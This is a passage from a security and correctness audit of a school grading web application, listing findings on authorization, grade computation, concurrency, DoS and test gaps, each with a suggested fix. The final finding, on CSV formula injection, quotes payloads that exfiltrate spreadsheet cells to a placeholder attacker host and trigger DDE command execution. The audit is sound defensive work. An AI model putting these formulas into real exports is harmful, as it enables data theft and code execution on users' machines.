**Suggested fix.** Add src/app/api/sync/run/__tests__/route.test.ts mirroring the digest twin (503 when SYNC_TRIGGER_SECRET unset, 401 on missing/wrong/wrong-length secret, 200 on match, x-sync-secret and bearer both accepted, and that runFullDirectorySync is not called on any auth failure). Better: extract the duplicated isAuthorized into one shared helper (e.g. src/lib/sync-secret.ts) tested once, so both cron endpoints share a single verified gate.


### S3 — Latent risk / data-integrity / maintainability

#### 16. GET /api/students/class discloses any student's class and groupId by arbitrary username at session tier

- **Area:** Authorization / Access · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/students/class/route.ts:31`

**What & why.** Guarded at `session` (denyUnlessAccess('session'), line 14), the handler accepts any `username` query param and returns that student's class name and groupId (`prisma.student.findUnique({ where: { username } })`, line 31; response lines 47-61). There is no check that the caller is the named student or is staff. A student-role session (src/lib/auth.ts:80-82) can therefore enumerate the class and rotation-group assignment of any other student by username.

**Failure scenario.** A signed-in student calls GET /api/students/class?username=<other.student> and learns which class and rotation group any classmate is in; iterating usernames maps the whole school's class/group membership. Lower impact than the PII leak above (only class name + groupId), but still an unauthorized horizontal read.

**Suggested fix.** For a student caller, only allow the lookup when the requested username resolves to the caller (resolveSessionStudent); otherwise require `staff`. This mirrors the self-only gating already used in /api/schedules/data's fallback and /api/me/photo.


#### 17. computeAverage NB-vs-GS sentinel result depends on teacher-id order, not the documented priority

- **Area:** Grade computation · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/lib/grades.ts:114`

**What & why.** computeAverage scans teachers for sentinels in a single `for (const teacherKey in studentGrades)` loop and returns the FIRST sentinel it meets: NICHT_BEURTEILT or GESTUNDEN, whichever teacher is encountered first. JS iterates integer-like object keys in ascending numeric order, so the outcome is decided by which teacher id holds which sentinel — not by any priority. The docstring/test claim NICHT_BEURTEILT is reported ahead of GESTUNDEN, but the passing test (grades.test.ts:123-129) only exercises the case where the NB teacher has the lower id (1 vs 2), giving false confidence. getFinalGradeDisplay (use-grade-editing.ts:198-201) turns this sentinel into a persisted Endnote value (NICHT_BEURTEILT=6 vs GESTUNDEN=7), so the stored/derived Endnote can flip between two distinct official statuses based purely on teacher id ordering.

**Failure scenario.** Student S has teacher id 2 recording GESTUNDEN (7) and teacher id 5 recording NICHT_BEURTEILT (6) for the first semester. Iteration hits id 2 first, so computeAverage returns 'gestunden'; getFinalGradeDisplay derives Endnote 7 and 'Alle speichern' can persist FinalGrade.grade=7 — even though a NICHT_BEURTEILT is present and the documented rule says nicht-beurteilt wins. Swapping which teacher holds which sentinel flips the result to 6.

**Suggested fix.** Scan for the intended-priority sentinel across all considered teachers before the other: e.g. collect flags hasNb/hasGs in the loop, then `if (hasNb) return 'nicht beurteilt'; if (hasGs) return 'gestunden'`. Add a test where the GESTUNDEN teacher has the lower id.


#### 18. Weight config accepts negative / >100 per-field values (only sum===100 enforced), producing grades outside 1-5 or silently dropped days

- **Area:** Grade computation · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/noten/weights/route.ts:54`

**What & why.** The weights PATCH validates only that the four weights sum to 100; it never bounds each field to [0,100]. The client input has min=0/max=100 (weights-popover.tsx:83-84) but the server does not, so a direct request with e.g. {200, -100, 0, 0} passes. These weights feed the weighted day-grade computed in computeStudentSummary (summary.ts:74-87) and the server-side transfer-prefill (transfer-prefill/route.ts:38-66), both of which divide sum by the in-play weight total. Negative weights make the weighted average exceed 5 (or go below 1), and can drive the divisor to exactly 0 for a day where marks exist, so that day is silently dropped from the average.

**Failure scenario.** A staff user POSTs {classId, groupId, schoolYearId, weightWiederholung:200, weightBericht:-100, weightMitarbeit:0, weightPraktischeArbeit:0} (sum 100, accepted). For a day with Wiederholung=5 and Bericht=3 marked: dayGrade = (5*200 + 3*(-100)) / (200-100) = 700/100 = 7 -> the Noten grid shows calculatedGrade 7 (impossible on the 1-5 scale) and the transfer prefill proposes 7. With {60,-60,50,50} a day where only Wiederholung and Bericht are marked yields divisor 60-60=0, so the day is dropped from the student's average entirely, skewing the computed grade.

**Suggested fix.** Validate each weight is a finite number in [0,100] (and integer if desired) before the sum check, rejecting the request otherwise, mirroring the client's min/max.


#### 19. Noten grid's calculated grade blends both semesters, diverging from the per-semester computation used for transfer

- **Area:** Grade computation · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/app/noten/page.tsx:146`

**What & why.** The grid computes a single calculatedGrade via computeStudentSummary(students, teachingDays, entries, weights, todayYmd) over ALL teaching days of the year; computeStudentSummary has no semester parameter and never partitions days by the semester change date (summary.ts:43-88). The very same weighted day-grade formula in transfer-prefill (transfer-prefill/route.ts:303-325) DOES split days into first/second semester via isSemester2 and produces two separate proposed marks. The grid renders its single blended number (noten-grid.tsx:747) directly beside the two per-semester Endnote inputs, so the figure a teacher reads while deciding the first-semester Endnote is contaminated by second-semester marks (and vice versa).

**Failure scenario.** A student has first-semester marks averaging 2 and second-semester marks averaging 5. The grid shows one calculatedGrade of ~3.5 next to both the 1st- and 2nd-semester Endnote fields, while the Notenmanagement transfer prefill for the same student proposes 2 for semester 1 and 5 for semester 2. A teacher trusting the grid's displayed number sets a first-semester Endnote near 3.5 instead of 2.

**Suggested fix.** Either compute and display two calculatedGrade values (per semester, using semesterChangeDate) in the grid to match transfer-prefill, or clearly scope the single value to the currently relevant semester.


#### 20. grades/batch reads current grades outside the advisory lock, so change-detection is stale and a concurrent locked-cell edit can be silently overwritten

- **Area:** Concurrency & data integrity · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/app/api/notensammler/grades/batch/route.ts:153`

**What & why.** The advisory lock (withSokratesLock) is taken only at line 181, but the snapshot of existing grades that drives change detection is read at line 153 with the top-level prisma client, before the lock, and the derived `changed` set is used both inside the lock to decide which cells are checked against isEditBlocked (line 188) and to record oldGrade (line 198). Because blockedKeys is populated only from `changed`, any cell whose incoming value equals the stale snapshot is classified 'unchanged', is never added to blockedKeys, and is therefore always written (gradesToWrite includes every non-blocked grade). The lock was added to make the read-check-write atomic, but the read that feeds the check sits outside it — so under concurrency a stale resave can both misreport oldGrade and bypass the hard-lock check on a cell that a concurrent authorised edit just changed.

**Failure scenario.** Semester is Sokrates-locked (lockedAll). The class lead (override holder) changes student S's grade in teacher T's column from 3 to 4 and commits. Teacher T (no override) then submits an 'Alle speichern' batch whose UI snapshot predates that change, so it carries grade=3 for that cell and T's server-side existingMap (read at line 153, possibly before the lead's commit, or simply reflecting T's own stale view) yields 3. `changed` excludes the cell (3 == 3), so it is never checked by isEditBlocked, never added to blockedKeys, and is written: T's request reverts the lead's locked-cell change from 4 back to 3, with no SokratesChangeNotice, defeating the lock for that cell.

**Suggested fix.** Move the existing-grades read inside the withSokratesLock callback and issue it through the transaction client `tx`, then compute `changed`/`existingMap`/blockedKeys from that in-lock snapshot so the check and the write see one consistent state. Alternatively gate every incoming cell that lands on a marked+locked semester by isEditBlocked regardless of whether it looks 'changed'.


#### 21. schedules/assignments POST mutates GroupAssignment and Student.groupId across many un-transacted writes; a mid-sequence failure leaves the cache and source-of-truth inconsistent

- **Area:** Concurrency & data integrity · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/app/api/schedules/assignments/route.ts:244`

**What & why.** The POST handler performs the full group re-shuffle as a sequence of independent, non-transactional statements: N GroupAssignment.upsert (line 245), a deleteMany of orphan GroupAssignment rows (line 262/269), then per-assignment Student.updateMany writing groupId (line 278/287), then a final updateMany clearing removedStudentIds (line 300). None of it is wrapped in prisma.$transaction, so if any statement throws (connection blip, timeout, aborted request) the handler returns 500 with the writes already done up to that point half-applied. GroupAssignment is the denormalized cache and Student.groupId the source of truth; a partial run drifts them apart. The GET back-fill (lines 107-125) only ever *adds* missing GroupAssignment rows, so it cannot repair a case where GroupAssignment was already emptied/rewritten but the student groupId updates did not all land.

**Failure scenario.** Admin saves a re-grouping of class 2BHIT: assignments = [{group1: 12 students}, {group2: 11 students}], previously 3 groups. The handler upserts group1/group2, deleteMany removes the now-orphan group3 GroupAssignment row, and begins the student updateMany calls; the DB connection drops after group1's students are updated but before group2's. The request 500s. Result: group3 no longer exists in GroupAssignment, group2's 11 students still carry their old groupId (possibly 3), and the rotation editor/schedule now shows a grouping the admin never approved — a saved state that is internally inconsistent with no rollback.

**Suggested fix.** Wrap the GroupAssignment upserts/deletes and all Student.groupId updateMany calls in a single prisma.$transaction so the re-shuffle is atomic and rolls back on any error. While there, restrict the student updateMany to `where: { id: { in: studentIds }, classId }` so a stray id cannot move a student from another class into this class's group numbering.


#### 22. Noten date-search binds rotation rows to an arbitrary weekday's turn calendar

- **Area:** Schedule & rotation · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/noten/search/route.ts:132`

**What & why.** The date-based grade search loads exactly one schedule per class via `prisma.schedule.findFirst({ where: { classId, schoolYearId }, orderBy: { createdAt: 'desc' } })` (lines 132-136) with no `selectedWeekday`, then maps ALL of the teacher's rotation rows (`teacherRotation.findMany({ where: { teacherId, classId: { in } } })`, lines 123-126, also unscoped by weekday/year) onto that single schedule's turn weeks (`scheduleData?.[rot.turnId]?.weeks`). For a class with multiple weekday plans, rotation rows from every weekday are resolved against one arbitrary weekday's calendar.

**Failure scenario.** Class 1A has a Monday plan and a Thursday plan with different Turnus week dates. A teacher searches by a date that is a Monday teaching week. The search resolves against the Thursday schedule (latest createdAt), whose TURNUS n weeks contain different dates, so the search either misses the class entirely or returns it under the wrong turn/date — producing incorrect grade-entry targets in the date search.

**Suggested fix.** Resolve one schedule per (class, weekday) and match each rotation row to the schedule sharing its `selectedWeekday`; scope the rotation query by schoolYearId. Same weekday-blind schedule lookup should be audited alongside the auto-select fix.


#### 23. adjustGroupCount fills the first non-full group entirely when shrinking, producing lopsided groups

- **Area:** Schedule & rotation · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/lib/group-distribution.ts:104`

**What & why.** When reducing the group count, removed students are redistributed with `const target = keep.find(g => g.students.length < maxSize)` (line 104) — always the first group that still has any room — filling it completely before moving to the next. This defeats the even-distribution guarantee that distributeStudentsEvenly otherwise provides, and can drive one group to maxSize while others sit well below it. renumberGroups(adjustGroupCount(...)) at schedule/create/page.tsx:365 has no re-balancing step afterward.

**Failure scenario.** 4 groups of 6 students each (24 total, maxSize 12). User lowers the group count to 3. group 4's 6 students each pick the first group with room = group 1, so the result is [12, 6, 6] instead of a balanced [8, 8, 8], and group 1 is pinned at the maximum. The Wechselplan is then generated over grossly uneven groups.

**Suggested fix.** Distribute removed students to the currently-smallest eligible group (e.g. sort/scan for the minimum `students.length` under maxSize) so shrinking keeps largest-minus-smallest <= 1, matching distributeStudentsEvenly. Note the existing unit tests encode the sequential-fill behaviour, so confirm the intended semantics before changing.


#### 24. Student sync silently resolves a normalized-username collision to one row (no ambiguity guard), unlike teacher sync

- **Area:** Directory sync & Entra · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/lib/class-student-sync.ts:500`

**What & why.** The student matcher indexes existing rows into a single-value Map keyed by lowercased username (studentByUsername, populated at line 500 with last-write-wins) and findExistingStudent (515-516) falls back to it: `studentByExternalId.get(user.oid) ?? studentByUsername.get(user.username.toLowerCase()) ?? null`. There is no check for multiple local rows sharing a username. Teacher sync guards exactly this: when usernameCandidates.length > 1 it records an 'Ambiguous local teacher match' issue and skips (teacher-sync.ts:216-224). Student sync has no equivalent, so a collision silently binds an Entra user to whichever colliding row survived in the map and overwrites that row's profile with the Entra user's firstName/lastName/email (update path 959-993), while the genuinely new student is never created (it resolved to the existing row) and the other colliding row is left unmatched and may be deactivated.

**Failure scenario.** Two active students normalize to the same username (e.g. two 'anna.mueller' from UPN/mail normalization, or an adopted legacy row colliding with a synced one). Only one is kept in studentByUsername. A new Entra student whose oid has no local match but whose username collides is matched to that surviving row: its name/email are overwritten with the new person's data, the new person gets no row of their own, and the displaced student can be pushed to toDeactivate -- effectively merging two distinct people into one record with no issue reported to the admin.

**Suggested fix.** Build studentByUsername as Map<string, row[]> like teacher-sync's byUsername, and when a username fallback would match more than one row (or a username match and an oid match disagree), emit an EntraUserMappingIssue and skip rather than silently binding to one, mirroring teacher-sync.ts:216-246.


#### 25. Collapsing a fresh event onto an already-digested unread row permanently excludes it from every future digest

- **Area:** Notifications · **Severity:** S3 _(verifier adjusted severity from S2)_ · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/lib/notifications.ts:112`

**What & why.** When notify() folds a new event onto an existing unread notification via dedupeKey, the updateMany writes `data: { ...payload, createdAt: now }` (line 112) but never resets `digestedAt`. `digestedAt` is written only by the digest's stampDigested (grep confirms it is set once and never cleared anywhere else). The digest query in src/lib/notification-digest.ts:57 selects rows with `digestedAt: null`. Once a row has been digested, any later collapse refreshes its type/params/createdAt but leaves digestedAt set, so the refreshed (now newer) event can never re-enter the digest. Because collapsing is the common path — the schedule wizard folds 3+ edits onto one `schedule:classId:year` key, times edits fold in, grades-entered folds cell-by-cell saves — the digest silently under-delivers its documented 'summary of what you missed' guarantee for exactly the unread-bell audience it exists to serve.

**Failure scenario.** T0: schedule-created for 5A creates notification N for teacher T (unread, digestedAt=null). T0+25h: digest run finds N (readAt null, digestedAt null, createdAt<cutoff), emails T, and stamps N.digestedAt=T0+25h. T ignores it. T0+30h: someone regenerates the plan -> schedule-assignments-changed collapses onto N (same dedupeKey); N.type becomes schedule-assignments-changed, N.createdAt=T0+30h, but N.digestedAt stays T0+25h. N remains unread. T0+60h: digest run's `where.digestedAt: null` excludes N. T is never emailed about the assignment change even though it is unread far longer than 24h.

**Suggested fix.** In the collapse updateMany, also clear the stamp: `data: { ...payload, createdAt: now, digestedAt: null }`, so a refreshed unread row re-enters the digest window like a brand-new event.


#### 26. recordSokratesChanges runs post-commit un-wrapped and can turn an already-saved grade write into a 500, losing the drift record on retry

- **Area:** Notifications · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/lib/sokrates-lock.ts:365`

**What & why.** recordSokratesChanges is called AFTER the grade-write transaction has committed (grades/route.ts:374 and batch/route.ts:244 are outside the withSokratesLock/$transaction block) and is NOT wrapped in bestEffort at the call site. Internally only the count query and the email are contained; the `class.findUnique` (line 331) and `sokratesChangeNotice.createMany` (line 365) are not. If either throws, the exception propagates to the route's outer catch and returns 500 'Failed to save grades' even though the grades are already persisted — the exact best-effort violation the notification layer is designed to avoid (see notifications.ts bestEffort docstring, and the _notify helpers which DO wrap post-commit work). Worse, on the user's retry the transaction re-reads previousGrade == the already-written value, so gradeChanged is false and `relevant` is empty, meaning the SokratesChangeNotice drift record (which the class lead relies on to know Sokrates needs re-syncing) is silently never recorded.

**Failure scenario.** Teacher edits a grade in a class already marked as entered into Sokrates. The grade transaction commits. A transient DB error (connection reset / statement timeout) makes recordSokratesChanges' createMany throw. The route returns 500; the teacher sees 'Failed to save grades' and retries. The retry's transaction reads the now-current grade, computes gradeChanged=false, so recordSokratesChanges gets no relevant changes and creates no SokratesChangeNotice and rings no bell/email. Net: grade changed, drift audit record permanently lost, class lead never told, and the user shown a false failure.

**Suggested fix.** Persist the SokratesChangeNotice rows inside the grade-write transaction (atomic with the change), and wrap the post-commit notify/email portion of recordSokratesChanges in bestEffort at the call site so a lookup or send failure can never 500 an already-committed save.


#### 27. putLf treats every non-2xx PUT (500/403/429, not just 404) as 'LF deleted' and POSTs a fresh LF, orphaning a duplicate in Notenmanagement

- **Area:** Notenmanagement integration · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/notensammler/transfer/route.ts:307`

**What & why.** On re-transfer of an already-recorded LF, `putLf` (line 305-314) PUTs the existing LF. `nmSend` never throws for HTTP errors — it returns `{ ok:false, status }`. `putLf` responds to ANY non-ok status by logging a warning and returning null (line 307-312), and the caller (line 333-341) interprets null as 'the stored LF is gone' and creates a brand-new LF via POST, then repoints the transfer row to the new lfId (line 342-345). Only HTTP 404 actually means the LF was deleted; a transient 500, a 429 rate-limit, or a 403 permission response all wrongly trigger a duplicate create. The original LF — carrying the previous grades, attributed to the teacher — is left orphaned in NM and is never PUT again (the row now points elsewhere).

**Failure scenario.** A teacher corrects one Endnote and re-transfers. NM returns a transient 500 (or 429) on `PUT /api/LFs/5001`. putLf returns null → the code POSTs a new LF #5002 and updates the transfer row to 5002. NM now contains both LF #5001 (old grades) and LF #5002 (new grades) for the same class/semester/subject; the student's grade is duplicated in the external gradebook and the stale LF is never reconciled.

**Suggested fix.** Only fall back to POST when the PUT status is 404 (LF genuinely absent). For other non-2xx statuses, surface the failure to the caller as an error (like postLf's 502) instead of silently creating a duplicate, so a transient NM error is retried rather than duplicated.


#### 28. Unbounded, unrate-limited client-error ingestion lets any signed-in user flood the ErrorLog table (storage-exhaustion DoS)

- **Area:** Crypto / secrets / env · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/client-errors/route.ts:46`

**What & why.** POST /api/client-errors is gated only at the 'session' tier (api-access.ts:54 and the requireAccess('session') guard), so ANY authenticated principal — including the lowest role 'user' — can post errors. Each call reaches recordError, which collapses repeats only by dedupeKey = sha1(location + ' ' + type + ' ' + message) (error-log.ts:43). By varying the message (or location/type) on every request the caller produces a distinct dedupeKey and therefore a NEW row on every POST (error-log.ts:101 upsert -> create branch). There is no per-actor cap, no global row cap, and no rate limiting; each row can hold up to ~2000 (message) + 10000 (stack) + 4000 (context) bytes. pruneErrorLogs only deletes rows older than 30 days (error-log.ts:137), so nothing bounds short-term growth.

**Failure scenario.** A user with role 'user' obtains a valid session cookie, then loops POST /api/client-errors with body {location:'x',type:'y',message:<unique counter + 2KB padding>, stack:<10KB>} 500,000 times. Each request inserts a fresh ErrorLog row (~16KB), writing ~8 GB and half a million rows; sustained, this exhausts Postgres storage / connection budget and degrades every ErrorLog query (the admin count/unresolvedCount query scans the bloated table), taking down the app for all users. No admin action or privileged role is required.

**Suggested fix.** Add abuse limits: cap distinct client-error rows per actor per time window (e.g. reject or coarsen after N inserts/hour keyed on gate.session.user), and/or add a global insert budget for source:'client'. Optionally coarsen the client dedupeKey (drop the free-text message from the hash for client source, keeping only location+type) so a varying message cannot fan out into unbounded rows.


#### 29. Wechselplan PDF recomputes teacher→group rotation from live student data, diverging from the saved plan when a group empties

- **Area:** PDF generation · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/components/pdf/WechselplanDocument.tsx:393`

**What & why.** The turnus grid does not print the persisted rotation. In PeriodRows each cell calls getGroupForTeacherAndTurn(groups, teacherIdx, turnIdx, assignments) (lines 393-394), which returns groups[rotatedGroupIndex(teacherIdx, turnIdx, groups.length)] (lines 264-273) — a pure round-robin whose modulus is groups.length. The assignment's own saved groupId is mapped in the route (mapAssignment, /api/export/route.ts:168-176) but never read by the PDF. Critically, `groups` is built in the route ONLY from students that currently have a group: prisma.student.findMany({ where:{ id:{in}, groupId:{not:null} } }) filtered further by the isActive:true middleware, then groupIds = distinct student.groupId (route lines 73-88). So groups.length = number of groups that still contain at least one ACTIVE student, recomputed at export time, not the group count the rotation was designed and persisted against.

**Failure scenario.** A class is set up with 4 groups and its TeacherRotation is saved (round-robin mod 4). Mid-year, directory sync deactivates the last remaining student of group 3 (soft-delete sets isActive=false). On the next Wechselplan export the student query drops those students, so groupIds becomes [1,2,4] and groups.length=3. Every turnus column is now printed as a round-robin mod 3 over [1,2,4], i.e. a completely different teacher→group schedule than the one saved and than what students/teachers already follow — with no warning. The printed plan silently contradicts the persisted rotation.

**Suggested fix.** Drive the printed per-turnus group from the persisted TeacherRotation / assignment.groupId rather than recomputing rotatedGroupIndex over a live, possibly-shrunken groups array; or fetch the full designed group set (all groups referenced by the schedule/assignments) so groups.length matches the count the rotation was saved with, independent of current student membership.


#### 30. Photo upload has no file-size or file-count limit; whole upload buffered in memory

- **Area:** Input validation & imports · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/admin/student-photos/upload/route.ts:225`

**What & why.** The upload handler calls request.formData() (line 43), which buffers every multipart part into memory, then does Buffer.from(await file.arrayBuffer()) for each file (lines 87 and 225). There is no Content-Length check, no per-file byte cap, and no cap on the number of files (the files loop at line 247 is unbounded). The only file-type gate is file.type (lines 70/206), which is attacker-controlled and, crucially, is checked AFTER the file has already been fully read into memory.

**Failure scenario.** A staff user (staff tier) POSTs a multipart body containing one ~2 GB part with Content-Type: image/jpeg (file.type is set by the client, so a 2 GB non-image passes the MIME allow-list). request.formData() plus file.arrayBuffer() load the entire 2 GB into the Node process heap, spiking memory and OOM-killing the container, taking the whole app offline for all users. Alternatively hundreds of files in one request achieve the same.

**Suggested fix.** Reject requests over a Content-Length threshold up front, enforce a per-file byte cap before reading arrayBuffer, cap the number of files per request, and validate real image magic bytes rather than trusting file.type.


#### 31. Student transfer invalidates source-class roster but not the destination class's cached students

- **Area:** Frontend / React · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/schedule/create/page.tsx:827`

**What & why.** After POSTing a student transfer, the handler invalidates `['students', selectedClass]` (source class, keyed by NAME) and `['group-assignments', selectedClassId]` and `['group-assignments', targetClassId]`, but never invalidates the destination class's student roster query. The students query key is `['students', selectedClass]` where selectedClass is the class NAME (page.tsx:254), and the transfer only knows `targetClassId` (a number), so the target roster cache `['students', <targetClassName>]` is left untouched. With the query's 5-minute staleTime, a previously-visited target class keeps serving a roster that is missing the just-transferred-in student.

**Failure scenario.** User opens class A in schedule/create (caches `['students','A']`), opens class B (caches `['students','B']`), goes back to A and transfers a student into B. `['students','A']` refetches (student gone - correct), but `['students','B']` stays cached without the new student. Switching to B within 5 minutes shows B's group grid without the transferred student, and initializing groups from that stale roster can place the student nowhere until a manual reload.

**Suggested fix.** Invalidate the target class's students too. Since the students query is keyed by class name, either look up the target class's name from the classes cache and invalidate `['students', targetClassName]`, or re-key the students query by classId so `['students', targetClassId]` can be invalidated directly alongside the group-assignments keys.


#### 32. Endnote and Betragensnote autosaves use separate debounce keys but write the same row, risking a lost update

- **Area:** Frontend / React · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/app/notensammler/_hooks/use-grade-editing.ts:267`

**What & why.** handleFinalGradeChange schedules under key `final:${studentId}:${semester}` and handleConductWishChange under key `conduct:${studentId}:${semester}`. Both call saveFinalGrade -> POST /api/notensammler/final-grades with the SAME (studentId, classId, semester) row, and each request carries BOTH fields (grade and conductNoteWish). Because the two debounce entries are keyed separately, editing the Endnote and the Betragensnote of the same student/semester within the debounce window arms two independent timers that fire two overlapping writes of the same row. Each write includes a snapshot of the OTHER field taken at edit time, so if the requests resolve out of network order the earlier-snapshotted request lands last and clobbers the newer field.

**Failure scenario.** Teacher types Endnote '2' (arms final-save at T+500 with conductNoteWish = null, the value before), then ~100ms later selects Betragensnote 'S1' (arms conduct-save at T+600 with grade=2). final-save fires at T+500 sending {grade:2, conduct:null}; conduct-save fires at T+600 sending {grade:2, conduct:'S1'}. Under normal ordering the server ends at {2,'S1'}, but if the T+500 request is delayed and lands after the T+600 one (ordinary network jitter, HTTP/1.1 connection reuse, retry), the server ends at {grade:2, conduct:null} and the just-entered Betragensnote 'S1' is silently lost. The grid still shows 'S1' locally, so nobody notices until reload.

**Suggested fix.** Use one debounce key per FinalGrade row (e.g. `finalrow:${studentId}:${semester}`) so the second edit replaces the first timer and only one write is in flight, and/or have the row save read the latest grade+conduct from a ref at fire time rather than from values captured when the timer was armed.


#### 33. route-guards regression test checks guards per-FILE, not per-handler, and its tier check uses the minimum required tier

- **Area:** Test coverage · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/__tests__/route-guards.test.ts:61`

**What & why.** The test titled '%s guards every exported handler' collects every exported GET/POST/PUT/PATCH/DELETE in a route.ts, then asserts `GUARD_PATTERNS.some(pattern => pattern.test(source))` — a single check against the whole file source (line 61). It therefore only proves the file contains at least one guard call somewhere, not that each handler calls one. Many route files export multiple handlers (admin/data has GET/POST/PUT/DELETE; notensammler/grades and user-roles have GET/POST/DELETE; ~20 files have 2+). A second, separate weakness: the follow-up test (lines 74-106) that catches a handler guarded below its policy tier compares the declared tier against `Math.min(...required.map(...))` (line 96), i.e. the LEAST-privileged method's requirement, so an under-guard on a higher-tier method in a mixed-tier file is not flagged.

**Failure scenario.** (a) A developer adds `export async function DELETE` to src/app/api/students/route.ts (which already guards GET and POST) but forgets `requireAccess`. The first test still passes because the file already contains guard calls for GET/POST; the second test never inspects DELETE because it only reads tiers from guard calls that ARE present. The defence-in-depth layer the whole test file exists to enforce (per its own header comment) is silently gone for DELETE. (b) In src/app/api/schedules/route.ts the policy is GET=session, POST=staff. If POST is mistakenly guarded `requireAccess('session')`, required=[staff,session], min=session, and `order.indexOf('session') < 1` is false — so the staff→session privilege drop on POST is NOT reported.

**Suggested fix.** Slice each handler's body (from its `export ... function NAME` to the next handler/EOF) and require a guard match within that slice, so every handler is individually verified. For the tier check, compare each handler's own declared tier against resolveAccessTier(route, thatMethod) rather than the file-wide minimum — parse which guard call sits inside which handler body.


#### 34. teacher-sync.ts (identity adoption + deactivation) has no tests, unlike its class-student-sync counterpart

- **Area:** Test coverage · **Severity:** S3 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/lib/teacher-sync.ts:257`

**What & why.** teacher-sync.ts is the directory-sync module that decides who exists as a Teacher (and thus holds the teacher/admin access tier). No test references previewTeacherSync or applyTeacherSync (grep confirms NONE). By contrast, the student side got a dedicated companion test, class-student-sync-move.test.ts, precisely because docs called that path out as previously untested. The untested teacher logic includes the security-sensitive parts: `willAdopt` (line 257) links an orphaned local Teacher row that has no externalId to an Entra OID by matching normalized username/email and stamps externalId/externalSource on it (lines 390-393); the ambiguity/conflict guards (lines 216-246) that are supposed to REFUSE to adopt when username and email point at different rows; the deactivation scope that only retires `externalSource === 'entra'` rows (line 280); and the integration of assertDeactivationWithinLimit whose activeBefore denominator (line 360) sums unchanged+toUpdate+toDeactivate but excludes reactivations. Only the pure guard function is tested (sync-guard.test.ts), never its wiring here.

**Failure scenario.** Regression example: someone reorders match precedence so email is consulted before the `usernameMatch.id !== emailMatch.id` conflict check, or loosens emailIdentityKey. A returning teacher 'a.huber' whose Entra email now collides with a different local row gets adopted onto the wrong Teacher id: applyTeacherSync stamps that person's Entra OID onto another teacher's row, so at next login resolveSessionTeacher maps the Entra identity to the wrong teacher — inheriting their classes, class-lead rights, and grade columns. Nothing in the suite fails. Equally, a change to the `externalSource === 'entra'` filter (line 280) could hard-deactivate LDAP/manually-created teachers, or skip deactivating departed Entra teachers who have lost access, with no test to catch it.

**Suggested fix.** Add a teacher-sync test (Prisma + graph mocked, mirroring class-student-sync-move.test.ts) asserting: adoption only when username AND email agree; the three ambiguity/conflict branches push an issue and skip rather than adopt; deactivation targets only entra-sourced active rows and never LDAP/manual rows; reactivation restamps externalId and clears deactivatedAt; and applyTeacherSync throws MassDeactivationError when selected deactivations exceed the ratio for the computed activeBefore.


#### 35. Directory-sync apply runs all writes in one default-timeout interactive transaction; a full-school nightly sync exceeds Prisma's 5s limit and rolls back entirely

- **Area:** Concurrency & data integrity · **Severity:** S3 · **Verdict:** PLAUSIBLE · **Confidence:** medium
- **Location:** `src/lib/class-student-sync.ts:818`

**What & why.** applyClassStudentSync wraps every class and student write in a single prisma.$transaction(async tx => {...}) with no options object, so Prisma's default interactive-transaction timeout (5000ms) and maxWait (2000ms) apply. The body issues sequential per-row awaits: each student create/update does student.update plus classMembership.upsert (and resolveClassIdForGroup may add a class.findUnique), i.e. 2-3 round-trips per student, ~1600-2400 round-trips for an ~800-student school, all inside the one transaction. applyTeacherSync (teacher-sync.ts:366) has the same shape. On a production DB with even a few ms of latency this overruns 5s, Prisma aborts with P2028 (transaction closed), the whole apply rolls back, and recordSyncRun logs 'failed'. This is most damaging on the unattended nightly path, which applies everything with no selection and no human to retry. It was noted in the prior review (§1.7) but the current code still passes no timeout — verified.

**Failure scenario.** Nightly cron calls applyClassStudentSync() (no selection) for a real HTL of ~800 students against a networked Postgres (~5ms RTT). The ~1600+ sequential statements inside the single interactive transaction take >5s; Prisma throws P2028 and rolls the transaction back. No students/classes are updated that night, recordSyncRun stores status:'failed', and every subsequent night fails identically until the roster shrinks or someone raises the timeout — so deactivations and class moves never land.

**Suggested fix.** Pass explicit options, e.g. prisma.$transaction(fn, { timeout: 120_000, maxWait: 20_000 }), sized to the largest expected roster, and batch the pure-insert paths (createMany for new students/classes; group updates with updateMany where possible) to cut round-trips. Consider chunking so one bad night does not roll back the entire school.


#### 36. Grades CSV export is vulnerable to spreadsheet formula injection

- **Area:** Input validation & imports · **Severity:** S3 · **Verdict:** PLAUSIBLE · **Confidence:** medium
- **Location:** `src/app/api/admin/grades/export/route.ts:83`

**What & why.** escapeCsvValue only wraps a value in quotes when it contains a comma, quote, or newline. It does NOT neutralize a value that begins with a formula trigger character (=, +, -, @, tab, or CR). Student/teacher names and usernames are written into the CSV verbatim (lines 68-80). When the downloaded grades_export_*.csv is opened in Excel or LibreOffice, any cell starting with '=' is evaluated as a formula.

**Failure scenario.** A teacher or student whose lastName/firstName/username (from directory sync, or re-introduced via the grades import round-trip) is set to =WEBSERVICE("http://attacker/?d="&A1) or =cmd|'/c calc'!A1. An admin exports all grades and opens the CSV in Excel: the formula runs, exfiltrating adjacent grade/PII cells to the attacker's server (WEBSERVICE/HYPERLINK) or triggering command execution via DDE. The function is explicitly named escapeCsvValue yet leaves this class of injection open.

